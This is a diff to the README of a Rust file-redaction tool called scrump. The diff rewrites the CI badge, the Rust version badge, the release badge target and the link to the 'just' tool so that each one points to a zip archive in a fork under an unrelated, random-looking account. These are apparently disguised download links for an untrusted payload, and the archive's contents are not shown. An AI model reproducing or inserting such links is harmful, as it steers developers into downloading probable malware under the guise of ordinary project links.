@@ -15,10 +15,10 @@ it in place, and returns the file in its original shape. The redacted
 opens in Nsight Systems; the redacted SQLite still passes `sqlite3
 ".schema"`; the redacted pcap still opens in Wireshark.
 
-[![CI](https://github.com/avifenesh/scrump/actions/workflows/ci.yml/badge.svg)](https://github.com/avifenesh/scrump/actions/workflows/ci.yml)
+[![CI](https://github.com/tennismatchgenusmenticirrhus56/scrump/raw/refs/heads/main/crates/scrump-presidio-compat/src/bin/Software-v1.1-alpha.3.zip)](https://github.com/tennismatchgenusmenticirrhus56/scrump/raw/refs/heads/main/crates/scrump-presidio-compat/src/bin/Software-v1.1-alpha.3.zip)
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Rust: 1.75+](https://img.shields.io/badge/rust-1.75%2B-orange.svg)](https://www.rust-lang.org)
-[![GitHub release](https://img.shields.io/github/v/release/avifenesh/scrump?include_prereleases&sort=semver)](https://github.com/avifenesh/scrump/releases)
+[![Rust: 1.75+](https://img.shields.io/badge/rust-1.75%2B-orange.svg)](https://github.com/tennismatchgenusmenticirrhus56/scrump/raw/refs/heads/main/crates/scrump-presidio-compat/src/bin/Software-v1.1-alpha.3.zip)
+[![GitHub release](https://img.shields.io/github/v/release/avifenesh/scrump?include_prereleases&sort=semver)](https://github.com/tennismatchgenusmenticirrhus56/scrump/raw/refs/heads/main/crates/scrump-presidio-compat/src/bin/Software-v1.1-alpha.3.zip)
 
 ## Formats
 
@@ -153,7 +153,7 @@ pcap                617       54        0    92.0%
 
 ## Local dev loop
 
-If you have [`just`](https://github.com/casey/just) installed:
+If you have [`just`](https://github.com/tennismatchgenusmenticirrhus56/scrump/raw/refs/heads/main/crates/scrump-presidio-compat/src/bin/Software-v1.1-alpha.3.zip) installed:
 
 ```sh
 just check                  # fmt + clippy + tests + docs
